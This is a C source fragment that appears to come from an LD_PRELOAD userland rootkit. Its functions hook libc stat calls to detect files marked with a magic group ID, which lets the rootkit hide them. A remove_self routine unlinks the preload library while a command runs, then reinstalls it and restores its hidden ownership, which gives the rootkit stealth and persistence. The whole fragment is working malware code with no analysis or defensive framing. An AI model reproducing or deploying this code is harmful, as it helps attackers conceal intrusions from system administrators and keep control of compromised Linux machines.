int hxstat(const char *path){
    struct stat s_fstat;
    memset(&s_fstat, 0, sizeof(struct stat));
    hook(o_xstat, "__xstat");
    o_xstat(_STAT_VER, path, &s_fstat);
    if(s_fstat.st_gid == MAGIC_GID) return 1;
    return 0;
}

int hlxstat(const char *path){
    struct stat s_fstat;
    memset(&s_fstat, 0, sizeof(struct stat));
    hook(o_lxstat, "__lxstat");
    o_lxstat(_STAT_VER, path, &s_fstat);
    if(s_fstat.st_gid == MAGIC_GID) return 1;
    return 0;
}

int hfxstat(int fd){
    struct stat s_fstat;
    memset(&s_fstat, 0, sizeof(struct stat));
    hook(o_fxstat, "__fxstat");
    o_fxstat(_STAT_VER, fd, &s_fstat);
    if(s_fstat.st_gid == MAGIC_GID) return 1;
    return 0;
}

int remove_self(const char *filename, char *const argv[], char *const envp[]){
    hook(o_unlink, "unlink");
    o_unlink(PRELOAD);

    pid_t child = fork();
    if(child < 0) return -1;
    else if(child == 0){
        if(envp != NULL){
            hook(o_execve, "execve");
            return o_execve(filename, argv, envp);
        }else{
            hook(o_execvp, "execvp");
            return o_execvp(filename, argv);
        }
    }

    wait(NULL);
    reinstall();

    hook(o_chown, "chown");
    o_chown(PRELOAD, 0, MAGIC_GID);
    exit(0);
}